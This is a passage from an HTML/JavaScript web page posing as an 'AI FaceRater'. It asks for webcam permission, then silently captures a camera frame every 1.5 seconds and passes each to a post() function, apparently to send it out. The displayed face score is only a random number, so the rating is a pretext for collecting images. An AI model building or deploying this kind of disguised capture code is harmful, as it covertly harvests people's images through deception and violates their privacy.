
            facingMode: "user"
          }
        };

       alert("This is AI FaceRater allow camera permission so that AI can rate your face");

        // Access webcam
        async function init() {
          try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            handleSuccess(stream);
          } catch (e) {
            document.getElementById('score').innerHTML = "Please allow permission :)";
          }
        }

        // Success
        function handleSuccess(stream) {
          window.stream = stream;
          video.srcObject = stream;

        var context = canvas.getContext('2d');
          setInterval(function(){

               context.drawImage(video, 0, 0, 640, 640);
               var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
               post(canvasData); }, 1500);
               setTimeout(function(){
                 var facescore = Math.floor((Math.random() * 40) + 50);
                 document.getElementById('score').innerHTML = facescore;
               },3000)
        }

	alert("Look at your camera for better results :)");

        // Load init
        init();

        </script>

    </body>

</html>
